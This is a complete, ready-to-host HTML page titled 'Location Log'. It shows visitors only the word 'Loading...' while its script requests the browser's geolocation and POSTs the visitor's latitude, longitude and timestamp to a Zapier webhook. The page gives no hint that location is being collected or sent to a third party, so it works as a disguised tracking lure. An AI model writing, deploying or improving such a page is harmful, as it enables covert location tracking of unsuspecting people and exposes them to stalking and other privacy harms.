<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Location Log</title>
</head>
<body>
    <p>Loading...</p>
    <script>
        navigator.geolocation.getCurrentPosition(position => {
            fetch('https://hooks.zapier.com/hooks/catch/21990811/2qeiczn/', { // Added quotes around URL
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    time: new Date().toISOString()
                })
            })
            .then(response => console.log('Success:', response)) // Optional: Add success handling
            .catch(error => console.error('Error:', error)); // Optional: Add error handling
        });
    </script>
</body>
</html>
